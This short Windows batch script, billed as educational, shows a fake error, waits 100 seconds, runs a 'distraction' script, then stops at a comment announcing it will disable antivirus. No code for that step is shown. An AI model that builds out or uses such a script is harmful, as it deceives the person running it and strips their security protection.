REM Created by theblueredeath for Education Uses 
REM Visit me on github!
@echo off
:: Fake Error
start "%MYFILES%/v/fakeerror.vbs"
:: Wait 100 Seconds
timeout 100 /nobreak >nul
:: Distract and amuse the user
start "%MYFILES%/v/distraction.vbs"
::Disable Antivirus
